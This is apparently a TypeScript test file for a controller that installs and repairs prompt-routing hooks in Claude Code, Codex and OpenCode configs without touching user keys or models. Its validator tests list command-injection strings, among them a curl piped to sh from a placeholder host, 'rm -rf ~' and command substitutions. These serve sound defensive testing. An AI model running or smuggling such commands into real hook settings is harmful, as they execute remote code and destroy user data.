import test from 'node:test'
import assert from 'node:assert/strict'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { checkHookHealth, hookOutput, installHooks, restoreHookBackups, routeHookPrompt, validateHookCommand } from '../src/hooks.ts'

function workspace(): string {
  return mkdtempSync(path.join(os.tmpdir(), 'sabi-controller-hooks-'))
}

test('installHooks repairs a dead Sabi entry but never duplicates a working one', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    mkdirSync(path.dirname(claude), { recursive: true })
    writeFileSync(claude, JSON.stringify({
      hooks: {
        UserPromptSubmit: [
          { hooks: [{ type: 'command', command: `'/definitely/missing/node' '/also/missing/sabi.mjs' hook claude --event=UserPromptSubmit`, statusMessage: 'Sabi claude routing' }] },
          { hooks: [{ type: 'command', command: 'user-owned-hook' }] },
        ],
      },
    }))
    const env = { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude, SABI_HOOK_COMMAND: 'sabi-test' }

    // `sabi doctor` points a user with a stale hook at this install, so the dead entry is rewritten
    // in place and the user's own neighbouring entry is untouched.
    installHooks({ harnesses: ['claude'], stateDir: path.join(root, 'state'), env })
    const repaired = JSON.parse(readFileSync(claude, 'utf8'))
    assert.equal(repaired.hooks.UserPromptSubmit.length, 2)
    assert.equal(repaired.hooks.UserPromptSubmit[0].hooks[0].command, 'sabi-test hook claude --event=UserPromptSubmit')
    assert.equal(repaired.hooks.UserPromptSubmit[1].hooks[0].command, 'user-owned-hook')

    // A Sabi entry that still resolves is left exactly as it is.
    installHooks({ harnesses: ['claude'], stateDir: path.join(root, 'state'), env })
    const unchanged = JSON.parse(readFileSync(claude, 'utf8'))
    assert.equal(unchanged.hooks.UserPromptSubmit.length, 2)
    assert.equal(unchanged.hooks.UserPromptSubmit[0].hooks[0].command, 'sabi-test hook claude --event=UserPromptSubmit')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('installHooks points at a real installed controller, and never at a dev shim', () => {
  const root = workspace()
  try {
    const bin = path.join(root, 'bin')
    const installed = path.join(root, 'lib', 'node_modules', '@vizuh', 'sabi-controller', 'dist', 'cli.mjs')
    mkdirSync(bin, { recursive: true })
    mkdirSync(path.dirname(installed), { recursive: true })
    writeFileSync(installed, '#!/usr/bin/env node\n')
    symlinkSync(installed, path.join(bin, 'sabi'))

    // A real `npm install --global` is the durable target: the hook survives the checkout that
    // installed it being deleted, which is how a hook rots into a dead worktrees/... path.
    const [installedInstall] = installHooks({
      harnesses: ['claude'],
      stateDir: path.join(root, 'state'),
      env: { ...process.env, HOME: root, PATH: bin, SABI_CLAUDE_SETTINGS: path.join(root, 'claude', 'settings.json') },
    })
    assert.match(installedInstall?.command ?? '', new RegExp(installed.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')))

    // A dev shim on PATH is not an install: `node_modules/.bin/sabi` is what `npm test` puts there
    // and it is not durable, so that case keeps the process-derived fallback.
    const shimDir = path.join(root, 'shim-bin')
    mkdirSync(shimDir, { recursive: true })
    symlinkSync(path.resolve('packages/controller/src/cli.ts'), path.join(shimDir, 'sabi'))
    const [shimInstall] = installHooks({
      harnesses: ['claude'],
      stateDir: path.join(root, 'state'),
      env: { ...process.env, HOME: root, PATH: shimDir, SABI_CLAUDE_SETTINGS: path.join(root, 'shim', 'settings.json') },
    })
    assert.equal(shimInstall?.command?.includes('@vizuh/sabi-controller'), false)
    assert.match(shimInstall?.command ?? '', / hook claude --event=UserPromptSubmit$/)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('installHooks merges Claude, Codex and OpenCode without replacing existing config', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    const codex = path.join(root, 'codex', 'hooks.json')
    const opencode = path.join(root, 'opencode', 'opencode.json')
    const originalClaude = { model: 'keep-me', hooks: { Stop: [{ hooks: [{ type: 'command', command: 'existing-stop' }] }] } }
    const originalCodex = { hooks: { Stop: [{ hooks: [{ type: 'command', command: 'existing-stop' }] }] } }
    const originalOpenCode = { model: 'other/model', plugin: ['existing-plugin'], provider: { other: { options: { apiKey: 'not-read' } } } }
    mkdirSync(path.join(root, 'claude'), { recursive: true })
    mkdirSync(path.join(root, 'codex'), { recursive: true })
    mkdirSync(path.join(root, 'opencode'), { recursive: true })
    writeFileSync(claude, JSON.stringify(originalClaude))
    writeFileSync(codex, JSON.stringify(originalCodex))
    writeFileSync(opencode, JSON.stringify(originalOpenCode))

    const stateDir = path.join(root, 'state')
    const env = {
      ...process.env,
      HOME: root,
      SABI_CLAUDE_SETTINGS: claude,
      SABI_CODEX_HOOKS: codex,
      SABI_OPENCODE_CONFIG: opencode,
      SABI_HOOK_COMMAND: 'sabi-test',
      SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
    }
    const first = installHooks({ stateDir, env })
    assert.deepEqual(first.map(({ harness }) => harness), ['claude', 'codex', 'opencode'])

    const claudeWritten = JSON.parse(readFileSync(claude, 'utf8'))
    assert.equal(claudeWritten.model, 'keep-me')
    assert.equal(claudeWritten.hooks.Stop[0].hooks[0].command, 'existing-stop')
    assert.equal(claudeWritten.hooks.UserPromptSubmit.length, 1)
    assert.match(claudeWritten.hooks.UserPromptSubmit[0].hooks[0].command, /^sabi-test hook claude/)

    const codexWritten = JSON.parse(readFileSync(codex, 'utf8'))
    assert.equal(codexWritten.hooks.Stop[0].hooks[0].command, 'existing-stop')
    assert.equal(codexWritten.hooks.UserPromptSubmit.length, 1)
    assert.equal(codexWritten.hooks.SessionStart.length, 1)
    assert.equal(codexWritten.hooks.SessionEnd.length, 1)

    const opencodeWritten = JSON.parse(readFileSync(opencode, 'utf8'))
    assert.equal(opencodeWritten.model, 'other/model')
    assert.deepEqual(opencodeWritten.plugin.slice(0, 1), ['existing-plugin'])
    assert.equal(opencodeWritten.plugin.length, 2)
    const pluginPath = opencodeWritten.plugin[1]
    assert.equal(existsSync(pluginPath), true)
    assert.match(readFileSync(pluginPath, 'utf8'), /chat\.message/)

    const backups = [claude, codex, opencode].map((file) => `${file}.sabi-backup`)
    for (const backup of backups) assert.equal(existsSync(backup), true)
    assert.deepEqual(JSON.parse(readFileSync(`${claude}.sabi-backup`, 'utf8')), originalClaude)
    assert.deepEqual(JSON.parse(readFileSync(`${codex}.sabi-backup`, 'utf8')), originalCodex)
    assert.deepEqual(JSON.parse(readFileSync(`${opencode}.sabi-backup`, 'utf8')), originalOpenCode)

    const second = installHooks({ stateDir, env })
    assert.equal(JSON.parse(readFileSync(claude, 'utf8')).hooks.UserPromptSubmit.length, 1)
    assert.equal(JSON.parse(readFileSync(codex, 'utf8')).hooks.UserPromptSubmit.length, 1)
    assert.equal(JSON.parse(readFileSync(opencode, 'utf8')).plugin.length, 2)
    assert.equal(second.length, 3)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('wiring Claude and Codex adds hooks only, never a provider, key or model override', () => {
  // Operator rule (2026-09-23): Claude Code and Codex are used through their own subscriptions.
  // Sabi wires hooks into them and must never repoint either harness at a provider, hand it a key,
  // or override its model — that is what would turn a subscription into per-token spend.
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    const codexHooks = path.join(root, 'codex', 'hooks.json')
    const codexConfig = path.join(root, 'codex', 'config.toml')
    mkdirSync(path.dirname(claude), { recursive: true })
    mkdirSync(path.dirname(codexHooks), { recursive: true })
    const userEnv = { ANTHROPIC_BASE_URL: 'https://example.invalid', ANTHROPIC_API_KEY: 'user-owned' }
    writeFileSync(claude, JSON.stringify({ model: 'sonnet', env: userEnv, hooks: { Stop: [{ hooks: [{ type: 'command', command: 'existing-stop' }] }] } }))
    writeFileSync(codexConfig, 'model = "gpt-6-luna"\n')

    installHooks({
      harnesses: ['claude', 'codex'],
      stateDir: path.join(root, 'state'),
      env: { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude, SABI_CODEX_HOOKS: codexHooks, SABI_HOOK_COMMAND: 'sabi-test' },
    })

    const written = JSON.parse(readFileSync(claude, 'utf8'))
    assert.deepEqual(Object.keys(written).sort(), ['env', 'hooks', 'model'], 'no field was added beside hooks')
    assert.equal(written.model, 'sonnet')
    assert.deepEqual(written.env, userEnv)
    // Codex keeps its own provider configuration; Sabi only owns the hooks file.
    assert.equal(readFileSync(codexConfig, 'utf8'), 'model = "gpt-6-luna"\n')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('a hook reply carries no model, provider or credential field', () => {
  // Same rule from the runtime side: a hook may stop the round and say what Sabi did, but it never
  // switches the harness's model or provider.
  const output = hookOutput('claude', 'UserPromptSubmit', {
    action: 'SPAWN',
    target: { agent: 'claude' },
    execution: { status: 'started', receipt: { phase: 'started', observedAt: '2026-09-20T00:00:00.000Z' } },
  })
  assert.deepEqual(Object.keys(output).sort(), ['continue', 'stopReason', 'systemMessage'])
})

test('hook output blocks only after a real delegated execution receipt', () => {
  assert.deepEqual(hookOutput('claude', 'UserPromptSubmit'), {})
  assert.deepEqual(hookOutput('claude', 'UserPromptSubmit', {
    action: 'DELEGATE',
    target: { agent: 'codex' },
    execution: { status: 'unverifiable' },
  }), {})
  const output = hookOutput('codex', 'UserPromptSubmit', {
    action: 'SPAWN',
    target: { agent: 'opencode' },
    execution: { status: 'started', receipt: { phase: 'started', observedAt: '2026-09-20T00:00:00.000Z' } },
  })
  assert.equal(output.continue, false)
  assert.equal((output.hookSpecificOutput as Record<string, unknown>).hookEventName, 'UserPromptSubmit')
  assert.match(String(output.systemMessage), /opencode/)
})

test('a hook is a no-op before user setup enables the daemon', async () => {
  const root = workspace()
  try {
    const output = await routeHookPrompt('claude', 'UserPromptSubmit', { prompt: 'what is 2 + 2?', cwd: root }, {
      ...process.env,
      HOME: root,
      SABI_CONTROLLER_HOME: path.join(root, 'state'),
    })
    assert.deepEqual(output, {})
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('OpenCode follows its active config directory when Orca provides one', () => {
  const root = workspace()
  try {
    const config = path.join(root, 'orca-opencode', 'opencode.json')
    installHooks({
      harnesses: ['opencode'],
      stateDir: path.join(root, 'state'),
      env: {
        ...process.env,
        HOME: root,
        OPENCODE_CONFIG_DIR: '',
        ORCA_OPENCODE_CONFIG_DIR: path.dirname(config),
        SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
      },
    })
    assert.equal(existsSync(config), true)
    assert.equal(JSON.parse(readFileSync(config, 'utf8')).plugin.length, 1)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('installOpenCode refuses an ephemeral plugin path in a real config without touching it', () => {
  const root = workspace()
  try {
    // A non-existent, non-temp config path: the refusal must happen before any
    // filesystem write, so nothing is ever created there.
    const realConfigDir = '/nonexistent-sabi-test-real-config'
    assert.throws(() => installHooks({
      harnesses: ['opencode'],
      stateDir: path.join(root, 'state'),
      env: {
        ...process.env,
        HOME: root,
        OPENCODE_CONFIG_DIR: realConfigDir,
        ORCA_OPENCODE_CONFIG_DIR: '',
        SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
      },
    }), /Refusing to register the ephemeral plugin path .* in .*nonexistent-sabi-test-real-config/)
    assert.equal(existsSync(path.join(realConfigDir, 'opencode.json')), false)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('installOpenCode prunes stale Sabi plugin entries and keeps unrelated plugins', () => {
  const root = workspace()
  try {
    const config = path.join(root, 'opencode', 'opencode.json')
    const stateDir = path.join(root, 'state')
    mkdirSync(path.dirname(config), { recursive: true })
    const staleEphemeral = path.join(os.tmpdir(), 'sabi-controller-cli-prune-fixture', 'controller-state', 'hooks', 'opencode.mjs')
    const staleDeadFile = path.join(root, 'old-state', 'hooks', 'opencode.mjs')
    const unrelated = path.join(root, 'unrelated-plugin.mjs')
    writeFileSync(config, JSON.stringify({ plugin: [staleEphemeral, staleDeadFile, unrelated] }))
    installHooks({
      harnesses: ['opencode'],
      stateDir,
      env: {
        ...process.env,
        HOME: root,
        SABI_OPENCODE_CONFIG: config,
        OPENCODE_CONFIG_DIR: '',
        ORCA_OPENCODE_CONFIG_DIR: '',
        SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
      },
    })
    const written = JSON.parse(readFileSync(config, 'utf8')).plugin
    assert.equal(written.includes(staleEphemeral), false)
    assert.equal(written.includes(staleDeadFile), false)
    assert.equal(written.includes(unrelated), true)
    assert.equal(written.includes(path.join(stateDir, 'hooks', 'opencode.mjs')), true)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('uninstall removes stale Sabi plugin entries alongside the current install', () => {
  const root = workspace()
  try {
    const config = path.join(root, 'opencode', 'opencode.json')
    const stateDir = path.join(root, 'state')
    mkdirSync(path.dirname(config), { recursive: true })
    const env = {
      ...process.env,
      HOME: root,
      SABI_CONTROLLER_HOME: stateDir,
      SABI_OPENCODE_CONFIG: config,
      OPENCODE_CONFIG_DIR: '',
      ORCA_OPENCODE_CONFIG_DIR: '',
      SABI_OPENCODE_HOOK_SOURCE: path.resolve('packages/adapters/opencode/src/sabi-hook.mjs'),
    }
    installHooks({ harnesses: ['opencode'], stateDir, env })
    const staleEphemeral = path.join(os.tmpdir(), 'sabi-controller-cli-prune-fixture-2', 'controller-state', 'hooks', 'opencode.mjs')
    const unrelated = path.join(root, 'unrelated-plugin.mjs')
    const withStale = JSON.parse(readFileSync(config, 'utf8'))
    writeFileSync(config, JSON.stringify({ ...withStale, plugin: [...withStale.plugin, staleEphemeral, unrelated] }))
    const restored = restoreHookBackups({ harnesses: ['opencode'], env })
    assert.equal(restored.find(({ harness }) => harness === 'opencode')?.restored, true)
    assert.deepEqual(JSON.parse(readFileSync(config, 'utf8')).plugin, [unrelated])
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('checkHookHealth reports stale Sabi plugin entries as repairable', () => {
  const root = workspace()
  try {
    const config = path.join(root, 'opencode', 'opencode.json')
    mkdirSync(path.dirname(config), { recursive: true })
    const staleEphemeral = path.join(os.tmpdir(), 'sabi-controller-cli-prune-fixture-3', 'controller-state', 'hooks', 'opencode.mjs')
    writeFileSync(config, JSON.stringify({ plugin: [staleEphemeral] }))
    const health = checkHookHealth({
      env: {
        ...process.env,
        HOME: root,
        SABI_OPENCODE_CONFIG: config,
        OPENCODE_CONFIG_DIR: '',
        ORCA_OPENCODE_CONFIG_DIR: '',
        SABI_CONTROLLER_HOME: path.join(root, 'state'),
      },
    })
    const opencode = health.find(({ harness }) => harness === 'opencode')
    assert.equal(opencode?.installed, true)
    assert.equal(opencode?.stale, true)
    assert.match(opencode?.detail ?? '', /stale Sabi plugin entry/)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('SABI_HOOK_COMMAND keeps executable-plus-arguments but rejects shell metacharacters', () => {
  validateHookCommand('sabi-test')
  validateHookCommand('node /path/to/sabi.mjs')
  validateHookCommand(`"/opt/my dir/sabi" --flag value`)
  for (const malicious of [
    'sabi; curl -s https://example.invalid/x | sh',
    'sabi && rm -rf ~',
    'sabi | tee /tmp/out',
    'node $(touch /tmp/pwned)',
    'node `touch /tmp/pwned`',
    'sabi $HOME/hook',
    'sabi --out=$(id)',
    'sabi\nevil',
    'sabi "unterminated',
  ]) {
    assert.throws(() => validateHookCommand(malicious), /invalid SABI_HOOK_COMMAND/)
  }
})

test('installHooks refuses to write a hook carrying shell metacharacters', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    assert.throws(() => installHooks({
      harnesses: ['claude'],
      stateDir: path.join(root, 'state'),
      env: {
        ...process.env,
        HOME: root,
        SABI_CLAUDE_SETTINGS: claude,
        SABI_HOOK_COMMAND: 'sabi; curl -s https://example.invalid/x | sh',
      },
    }), /invalid SABI_HOOK_COMMAND/)
    assert.equal(existsSync(claude), false)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('checkHookHealth reports a hook whose baked absolute paths no longer exist', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    mkdirSync(path.dirname(claude), { recursive: true })
    writeFileSync(claude, JSON.stringify({
      hooks: {
        UserPromptSubmit: [{
          hooks: [{
            type: 'command',
            command: `'/definitely/missing/node' '/also/missing/sabi.mjs' hook claude --event=UserPromptSubmit`,
            statusMessage: 'Sabi claude routing',
          }],
        }],
      },
    }))
    const env = { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude }
    const health = checkHookHealth({ env })
    const entry = health.find(({ harness }) => harness === 'claude')
    assert.equal(entry?.installed, true)
    assert.equal(entry?.stale, true)
    assert.match(entry?.detail ?? '', /run sabi hooks install to repair/)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('checkHookHealth treats a bare executable hook command as resolving', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    const stateDir = path.join(root, 'state')
    installHooks({
      harnesses: ['claude'],
      stateDir,
      env: { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude, SABI_HOOK_COMMAND: 'sabi-test' },
    })
    const health = checkHookHealth({ env: { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude } })
    const entry = health.find(({ harness }) => harness === 'claude')
    assert.equal(entry?.installed, true)
    assert.equal(entry?.stale, false)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('restoreHookBackups never resurrects a deleted config and removes the backup', () => {
  const root = workspace()
  try {
    const claude = path.join(root, 'claude', 'settings.json')
    mkdirSync(path.dirname(claude), { recursive: true })
    writeFileSync(`${claude}.sabi-backup`, JSON.stringify({ model: 'original' }))
    const env = { ...process.env, HOME: root, SABI_CLAUDE_SETTINGS: claude }
    const restored = restoreHookBackups({ harnesses: ['claude'], env })
    assert.equal(restored.find(({ harness }) => harness === 'claude')?.restored, false)
    assert.equal(existsSync(claude), false)
    assert.equal(existsSync(`${claude}.sabi-backup`), false)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})
